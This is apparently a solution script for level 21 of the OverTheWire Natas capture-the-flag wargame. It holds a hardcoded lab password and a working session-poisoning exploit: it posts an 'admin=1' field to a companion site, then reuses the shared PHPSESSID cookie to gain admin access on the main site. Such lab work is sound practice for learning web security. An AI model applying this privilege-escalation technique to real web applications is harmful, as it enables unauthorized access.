import requests

username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/?debug=true".format(username)
experimenter_url = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=true"

# response = session.get(url, auth=(username, password))
# content = response.text
# print(content)

# response = session.get(experimenter_url, auth=(username, password))
# content = response.text
# print(content)

response = session.post(experimenter_url, data={
                        "submit": "", "admin": "1"}, auth=(username, password))
content = response.text
session_id = session.cookies["PHPSESSID"]

response = session.post(
    url, cookies={"PHPSESSID": session_id}, auth=(username, password))
content = response.text
print(content)
